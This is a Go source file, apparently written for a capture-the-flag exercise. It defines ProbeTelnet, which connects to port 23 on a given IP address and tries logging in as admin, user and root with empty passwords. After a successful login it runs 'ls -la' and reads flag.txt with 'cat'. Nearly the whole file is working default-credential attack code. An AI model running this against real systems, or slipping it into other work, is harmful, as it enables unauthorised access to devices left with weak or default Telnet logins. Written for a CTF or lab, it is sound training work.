package definitions

import (
	"fmt"
	"strings"
	"time"

	"github.com/ziutek/telnet"
)

func ProbeTelnet(ipAddress string) {
	usernames := []string{"admin", "user", "root"}
	address := fmt.Sprintf("%s:23", ipAddress) // Format the IP address and port number
	fmt.Println("Connecting to Telnet", address)
	conn, err := telnet.Dial("tcp", address) // Establish a Telnet connection to the address
	if err != nil {
		fmt.Println("Connection Failed:", err)
		return
	}
	fmt.Println("Connected to Telnet", address)
	//Scroll scan buffer for login prompt
	scrollScanBuffer(conn, "login:")
	for _, username := range usernames {
		fmt.Printf("Trying to log in with username: %s\n", username)
		// Send the username
		conn.SetUnixWriteMode(true)
		conn.Write([]byte(username + "\n"))
		conn.Write([]byte("\n"))     // Send the password
		time.Sleep(10 * time.Second) // Wait for the server to process the login
		// Read the response from the server

		buf := make([]byte, 50000)
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Failed to read response:", err)
			break
		}

		response := string(buf[:n])
		fmt.Println(
			"Response:", response,
		)

		// Check if the response indicates a successful login
		if strings.Contains(response, "Welcome") || strings.Contains(response, "Success") {
			fmt.Println("Login succeeded with username:", username)
			scrollScanBuffer(conn, "#")
			fmt.Println("Buffer Scrolled")
			conn.Write([]byte("ls -la\n"))
			time.Sleep(5 * time.Second)
			scrollScanBuffer(conn, "#")
			filepath := readBuffer(conn)
			fmt.Println("Filepath:", filepath)
			if strings.Contains(filepath, "flag.txt") {
				fmt.Println("Flag file found")
				conn.Write([]byte("cat flag.txt\n"))
				time.Sleep(5 * time.Second)
				fmt.Println("Flag: " + readBuffer(conn))
				break
			} else {
				fmt.Println("Flag file not found")
			}
		} else {
			fmt.Println("Login failed with username:", username)
		}
	}
	conn.Close() // Close the connection
	fmt.Println("Connection closed")
}

func scrollScanBuffer(connection *telnet.Conn, keyword string) {
	for {
		response := readBuffer(connection)
		if strings.Contains(response, keyword) {
			return
		}
	}

}

func readBuffer(connection *telnet.Conn) string {
	buf := make([]byte, 50000)
	n, err := connection.Read(buf)
	if err != nil {
		fmt.Println("Failed to read response:", err)
		return ""
	}
	response := string(buf[:n])
	fmt.Println(
		"Response:", response,
	)
	return response
}
